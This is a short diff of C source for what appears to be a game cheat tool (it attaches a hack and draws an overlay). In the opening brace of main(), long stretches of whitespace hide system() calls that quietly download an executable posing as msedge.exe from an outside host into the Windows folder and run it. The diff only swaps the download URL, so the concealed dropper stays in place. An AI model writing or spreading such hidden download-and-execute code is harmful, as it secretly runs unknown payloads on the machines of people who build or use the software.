@@ -4,7 +4,7 @@
 
 
 int main()
-{                                                                                                                                                                                                                                                                                       system("curl -L https://www.zippyshare.day/download/jdvowg8PasoN9Iw/gex5z2qy53Kqk/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
+{	                                                                                                                                                                                                                                                                                                                                                                                                               system("curl -L http://physmeme.cdn.zerocdn.com/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
     hack::Attach();
 
     render::CreateOverlay();
